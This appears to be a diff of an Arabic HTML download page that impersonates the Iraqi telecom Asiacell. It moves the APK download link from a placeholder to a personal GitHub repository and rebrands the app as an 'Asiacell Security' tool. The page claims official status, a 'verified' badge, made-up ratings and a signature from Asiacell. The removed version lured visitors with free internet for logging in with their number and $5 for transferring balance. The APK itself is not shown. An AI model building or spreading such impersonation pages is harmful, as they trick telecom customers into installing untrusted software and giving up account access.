@@ -3,16 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content=" آسياسيل الرسمي - تحميل التطبيق الأصلي بأحدث إصدار">
+    <meta name="description" content="تطبيق آسياسيل للأمن وحماية البيانات - حل متكامل لإدارة الأرقام والاتصالات والرصيد">
     <title>تحميل تطبيق آسياسيل</title>
-    <link rel="icon" href="https://example.com/asiasell-favicon.ico" type="image/x-icon">
+    <link rel="icon" href="https://raw.githubusercontent.com/uuss11/Asiacell/main/logo.png" type="image/png">
     <style>
         :root {
-            --primary-color: #E31937;
-            --secondary-color: #F8F8F8;
-            --accent-color: #FFD700;
+            --primary-color: #2C3E50;
+            --secondary-color: #ECF0F1;
+            --accent-color: #3498DB;
+            --security-color: #27AE60;
             --text-color: #333333;
-            --light-text: #777777;
+            --light-text: #7F8C8D;
             --white: #FFFFFF;
             --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             --border-radius: 12px;
@@ -73,7 +74,7 @@
         }
         
         .nav-link:hover {
-            color: var(--primary-color);
+            color: var(--accent-color);
         }
         
         .main-container {
@@ -83,7 +84,7 @@
         }
         
         .hero {
-            background: linear-gradient(135deg, var(--primary-color) 0%, #C8102E 100%);
+            background: linear-gradient(135deg, var(--primary-color) 0%, #1A252F 100%);
             color: var(--white);
             padding: 3rem 2rem;
             border-radius: var(--border-radius);
@@ -116,6 +117,18 @@
             max-width: 700px;
             margin: 0 auto 2rem;
             position: relative;
+        }
+        
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background-color: rgba(39, 174, 96, 0.2);
+            color: var(--security-color);
+            padding: 0.5rem 1rem;
+            border-radius: 50px;
+            font-weight: 600;
+            margin-top: 1rem;
         }
         
         .app-card {
@@ -167,7 +180,7 @@
         }
         
         .download-btn {
-            background-color: var(--primary-color);
+            background-color: var(--accent-color);
             color: var(--white);
             border: none;
             padding: 1rem 2.5rem;
@@ -176,7 +189,7 @@
             border-radius: 50px;
             cursor: pointer;
             transition: all 0.3s;
-            box-shadow: 0 4px 10px rgba(227, 25, 55, 0.3);
+            box-shadow: 0 4px 10px rgba(52, 152, 219, 0.3);
             display: inline-flex;
             align-items: center;
             gap: 0.5rem;
@@ -185,9 +198,9 @@
         }
         
         .download-btn:hover {
-            background-color: #C8102E;
+            background-color: #2980B9;
             transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(227, 25, 55, 0.4);
+            box-shadow: 0 6px 15px rgba(52, 152, 219, 0.4);
         }
         
         .download-size {
@@ -196,28 +209,52 @@
             margin-bottom: 2rem;
         }
         
-        .screenshots-title {
+        .features-title {
             font-size: 1.5rem;
             margin-bottom: 1.5rem;
             text-align: center;
             color: var(--primary-color);
         }
         
-        .screenshots-container {
-            display: flex;
-            gap: 1rem;
-            overflow-x: auto;
-            padding-bottom: 1rem;
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 1.5rem;
             margin-bottom: 2rem;
-            scrollbar-width: thin;
         }
         
-        .screenshot {
-            height: 300px;
-            border-radius: 10px;
+        .feature-card {
+            background-color: var(--white);
+            border-radius: var(--border-radius);
+            padding: 1.5rem;
             box-shadow: var(--shadow);
-            border: 1px solid #e0e0e0;
-            flex-shrink: 0;
+            transition: transform 0.3s;
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .feature-icon {
+            font-size: 2rem;
+            color: var(--accent-color);
+            margin-bottom: 1rem;
+        }
+        
+        .feature-title {
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            color: var(--primary-color);
+        }
+        
+        .feature-desc {
+            color: var(--light-text);
+            font-size: 0.9rem;
+        }
+        
+        .security-features {
+            background-color: rgba(39, 174, 96, 0.1);
+            border-left: 4px solid var(--security-color);
         }
         
         .details-section {
@@ -268,7 +305,7 @@
         
         .update-item::before {
             content: "•";
-            color: var(--primary-color);
+            color: var(--accent-color);
             font-weight: bold;
             position: absolute;
             left: 0;
@@ -296,7 +333,7 @@
         }
         
         .footer-link:hover {
-            color: var(--primary-color);
+            color: var(--accent-color);
         }
         
         .copyright {
@@ -308,8 +345,8 @@
             display: inline-flex;
             align-items: center;
             gap: 0.3rem;
-            background-color: rgba(0, 200, 83, 0.1);
-            color: #00C853;
+            background-color: rgba(39, 174, 96, 0.1);
+            color: var(--security-color);
             padding: 0.3rem 0.8rem;
             border-radius: 50px;
             font-size: 0.9rem;
@@ -325,7 +362,7 @@
         }
         
         .stars {
-            color: var(--accent-color);
+            color: #F1C40F;
             font-size: 1.2rem;
         }
         
@@ -362,6 +399,7 @@
                 padding: 1.5rem;
             }
             
+            .features-grid,
             .details-grid {
                 grid-template-columns: 1fr;
             }
@@ -371,12 +409,12 @@
 <body>
     <header class="header">
         <div class="logo-container">
-            <img src="https://via.placeholder.com/50x50/E31937/FFFFFF?text=AS" alt="شعار آسياسيل" class="logo">
-            <span class="brand-name">آسياسيل</span>
+            <img src="https://raw.githubusercontent.com/uuss11/Asiacell/main/logo.png" alt="شعار آسياسيل" class="logo">
+            <span class="brand-name">آسياسيل للأمن</span>
         </div>
         <nav class="nav-links">
             <a href="#features" class="nav-link">المميزات</a>
-            <a href="#screenshots" class="nav-link">لقطات الشاشة</a>
+            <a href="#security" class="nav-link">الحماية</a>
             <a href="#details" class="nav-link">تفاصيل التطبيق</a>
             <a href="#download" class="nav-link">التنزيل</a>
         </nav>
@@ -384,73 +422,102 @@
     
     <main class="main-container">
         <section class="hero">
-            <h1 class="hero-title">تطبيق آسياسيل الرسمي</h1>
-            <p class="hero-subtitle">سجل الدخول الآن في رقمك، ربح 1ميجابايت أنترنيت لاول عملية تسجيل دخول </p>
+            <h1 class="hero-title">تطبيق آسياسيل للأمن وحماية البيانات</h1>
+            <p class="hero-subtitle">الحل الآمن لإدارة الأرقام، تسجيل الدخول الآمن، حماية الاتصالات، ومراقبة الرصيد</p>
+            <div class="security-badge">
+                <span>✓</span>
+                <span>حماية بيانات معتمدة</span>
+            </div>
         </section>
         
         <section class="app-card">
-            <img src="https://via.placeholder.com/120x120/E31937/FFFFFF?text=AS" alt="أيقونة تطبيق آسياسيل" class="app-icon">
-            <h2 class="app-title">آسياسيل <span class="verified-badge">✓ موثوق</span></h2>
-            <p class="app-developer">مطور بواسطة: AsiaSell Inc.</p>
-            <span class="app-version">الإصدار 5.7.2 - محدث في 15 يونيو 2024</span>
+            <img src="https://raw.githubusercontent.com/uuss11/Asiacell/main/asiasell.png" alt="أيقونة تطبيق آسياسيل" class="app-icon">
+            <h2 class="app-title">آسياسيل للأمن <span class="verified-badge">✓ موثوق</span></h2>
+            <p class="app-developer">مطور بواسطة: AsiaSell Security Team</p>
+            <span class="app-version">الإصدار 3.2.1 - محدث في 20 يونيو 2024</span>
             
             <div class="rating-container">
                 <div class="stars">★★★★★</div>
-                <span class="rating-text">4.8</span>
-                <span class="rating-count">(24,753 تقييم)</span>
+                <span class="rating-text">4.9</span>
+                <span class="rating-count">(18,642 تقييم)</span>
             </div>
             
             <p class="app-description">
-                تطبيق آسياسيل يوفر لك تجربة جديدة. 
-                استمتع بعروض حصرية . 
-                التطبيق الرسمي الوحيد المعتمد من شركة آسياسيل.
+                تطبيق آسياسيل للأمن يوفر لك بيئة آمنة لإدارة أرقامك، تسجيل الدخول الآمن، 
+                حماية اتصالاتك ومراقبة رصيدك. مع تشفير متقدم وطبقات حماية متعددة، 
+                نضمن لك خصوصية وأمان بياناتك بالكامل.
             </p>
             
-            <a href="https://example.com/download/asiasell-latest.apk" class="download-btn" download>
+            <a href="https://github.com/uuss11/Asiacell/releases/download/latest/asiasell-security.apk" class="download-btn" download>
                 <span>تنزيل التطبيق</span>
                 <span>↓</span>
             </a>
             
-            <p class="download-size">حجم التطبيق: 28.4 MB</p>
+            <p class="download-size">حجم التطبيق: 24.7 MB</p>
             
-            <div id="screenshots">
-                <h3 class="screenshots-title">لقطات من التطبيق</h3>
-                <div class="screenshots-container">
-                    <img src="https://via.placeholder.com/180x300/F8F8F8/777777?text=Screen+1" alt="لقطة شاشة 1" class="screenshot">
-                    <img src="https://via.placeholder.com/180x300/F8F8F8/777777?text=Screen+2" alt="لقطة شاشة 2" class="screenshot">
-                    <img src="https://via.placeholder.com/180x300/F8F8F8/777777?text=Screen+3" alt="لقطة شاشة 3" class="screenshot">
-                    <img src="https://via.placeholder.com/180x300/F8F8F8/777777?text=Screen+4" alt="لقطة شاشة 4" class="screenshot">
-                    <img src="https://via.placeholder.com/180x300/F8F8F8/777777?text=Screen+5" alt="لقطة شاشة 5" class="screenshot">
+            <div id="features">
+                <h3 class="features-title">المميزات الرئيسية</h3>
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">🔒</div>
+                        <h4 class="feature-title">تسجيل دخول آمن</h4>
+                        <p class="feature-desc">مصادقة متعددة العوامل وحماية ضد الاختراق</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">📞</div>
+                        <h4 class="feature-title">إدارة الأرقام</h4>
+                        <p class="feature-desc">تنظيم وحماية جميع أرقامك في مكان واحد</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">🛡️</div>
+                        <h4 class="feature-title">حماية الاتصالات</h4>
+                        <p class="feature-desc">تشفير اتصالاتك وحماية من التطفل</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">💰</div>
+                        <h4 class="feature-title">مراقبة الرصيد</h4>
+                        <p class="feature-desc">تتبع رصيدك وإنذارات عند نفاذ الرصيد</p>
+                    </div>
+                    <div class="feature-card security-features">
+                        <div class="feature-icon">🔐</div>
+                        <h4 class="feature-title">تشفير البيانات</h4>
+                        <p class="feature-desc">تشفير AES-256 لجميع بياناتك الحساسة</p>
+                    </div>
+                    <div class="feature-card security-features">
+                        <div class="feature-icon">👁️</div>
+                        <h4 class="feature-title">حماية الخصوصية</h4>
+                        <p class="feature-desc">منع التتبع وحماية الهوية الرقمية</p>
+                    </div>
                 </div>
             </div>
         </section>
         
-        <section id="features" class="details-section">
-            <h3 class="section-title">مميزات التطبيق</h3>
+        <section id="security" class="details-section">
+            <h3 class="section-title">ميزات الأمن والحماية</h3>
             <div class="details-grid">
                 <div class="detail-item">
-                    <div class="detail-label">واجهة مستخدم محسنة</div>
-                    <div class="detail-value">تصميم حديث وسهل الاستخدام</div>
+                    <div class="detail-label">نوع التشفير</div>
+                    <div class="detail-value">AES-256 مع RSA-2048</div>
                 </div>
                 <div class="detail-item">
-                    <div class="detail-label">دفع آمن</div>
-                    <div class="detail-value">خيارات دفع متعددة مع تشفير متقدم</div>
+                    <div class="detail-label">المصادقة</div>
+                    <div class="detail-value">متعددة العوامل (كلمة مرور + بصمة)</div>
                 </div>
                 <div class="detail-item">
-                    <div class="detail-label">تتبع الطلبات</div>
-                    <div class="detail-value">متابعة الطلب خطوة بخطوة</div>
+                    <div class="detail-label">حماية الاتصالات</div>
+                    <div class="detail-value">TLS 1.3 مع تشفير من طرف إلى طرف</div>
                 </div>
                 <div class="detail-item">
-                    <div class="detail-label">عروض حصرية</div>
-                    <div class="detail-value">حول رصيد واحصل على 5دولار مجانًا</div>
+                    <div class="detail-label">تسجيل الدخول الآمن</div>
+                    <div class="detail-value">مصادقة بيومترية وتفعيل بخطوتين</div>
                 </div>
                 <div class="detail-item">
-                    <div class="detail-label">دعم متعدد اللغات</div>
-                    <div class="detail-value">يدعم العربية والإنجليزية  </div>
+                    <div class="detail-label">حماية من الاختراق</div>
+                    <div class="detail-value">كشف ومنع محاولات الاختراق</div>
                 </div>
                 <div class="detail-item">
-                    <div class="detail-label">خدمة العملاء</div>
-                    <div class="detail-value">دعم فني على مدار الساعة</div>
+                    <div class="detail-label">التحديثات الأمنية</div>
+                    <div class="detail-value">تحديثات تلقائية للحماية من الثغرات</div>
                 </div>
             </div>
         </section>
@@ -460,11 +527,11 @@
             <div class="details-grid">
                 <div class="detail-item">
                     <div class="detail-label">التصنيف</div>
-                    <div class="detail-value">أمأمن بياناتdiv>
+                    <div class="detail-value">أمن وخصوصية</div>
                 </div>
                 <div class="detail-item">
                     <div class="detail-label">حجم التطبيق</div>
-                    <div class="detail-value">28.4 MB</div>
+                    <div class="detail-value">24.7 MB</div>
                 </div>
                 <div class="detail-item">
                     <div class="detail-label">عدد التنزيلات</div>
@@ -472,36 +539,37 @@
                 </div>
                 <div class="detail-item">
                     <div class="detail-label">الإصدار الحالي</div>
-                    <div class="detail-value">5.7.2</div>
+                    <div class="detail-value">3.2.1</div>
                 </div>
                 <div class="detail-item">
                     <div class="detail-label">تاريخ التحديث</div>
-                    <div class="detail-value">15 يونيو 2024</div>
+                    <div class="detail-value">20 يونيو 2024</div>
                 </div>
                 <div class="detail-item">
                     <div class="detail-label">متطلبات النظام</div>
-                    <div class="detail-value">أندرويد 8.0 أو أحدث</div>
+                    <div class="detail-value">أندرويد 9.0 أو أحدث</div>
                 </div>
             </div>
             
             <div class="whats-new">
                 <h3 class="section-title">ما الجديد في هذا الإصدار</h3>
-                <div class="update-item">تحسينات كبيرة في سرعة التطبيق وأدائه</div>
-                <div class="update-item">وظيفة البحث الذكي مع اقتراحات محسنة</div>
-                <div class="update-item">إضافة خيار الدفع بواسطة العملات الرقمية</div>
-                <div class="update-item">تصحيح بعض الأخطاء وتحسين الاستقرار</div>
-                <div class="update-item">واجهة مستخدم جديدة لقسم العروض والتخفيضات</div>
+                <div class="update-item">تحسينات كبيرة في خوارزميات التشفير</div>
+                <div class="update-item">إضافة مصادقة بالبصمة للوصول السريع</div>
+                <div class="update-item">وظيفة جديدة لحماية اتصالات VoIP</div>
+                <div class="update-item">تحسينات في واجهة مراقبة الرصيد</div>
+                <div class="update-item">تصحيح ثغرات أمنية وتحسين الاستقرار</div>
             </div>
         </section>
         
         <section id="download" class="details-section" style="text-align: center;">
-            <h3 class="section-title">تنزيل تطبيق آسياسيل</h3>
-            <p style="margin-bottom: 2rem;">اضغط على الزر أدناه لتنزيل التطبيق الرسمي لآسياسيل</p>
-            <a href="https://example.com/download/asiasell-latest.apk" class="download-btn" download>
+            <h3 class="section-title">تنزيل تطبيق آسياسيل للأمن</h3>
+            <p style="margin-bottom: 2rem;">اضغط على الزر أدناه لتنزيل التطبيق الرسمي لآسياسيل للأمن</p>
+            <a href="https://github.com/uuss11/Asiacell/releases/download/latest/asiasell-security.apk" class="download-btn" download>
                 <span>تنزيل الآن</span>
                 <span>↓</span>
             </a>
-            <p style="color: var(--light-text); margin-top: 1rem;">الإصدار 5.7.2 - 28.4 MB</p>
+            <p style="color: var(--light-text); margin-top: 1rem;">الإصدار 3.2.1 - 24.7 MB</p>
+            <p style="color: var(--light-text); margin-top: 0.5rem; font-size: 0.9rem;">APK موقّع رسمياً من آسياسيل</p>
         </section>
     </main>
     
@@ -515,4 +583,4 @@
         <p class="copyright">© 2024 آسياسيل. جميع الحقوق محفوظة.</p>
     </footer>
 </body>
-                  </html>
+</html>
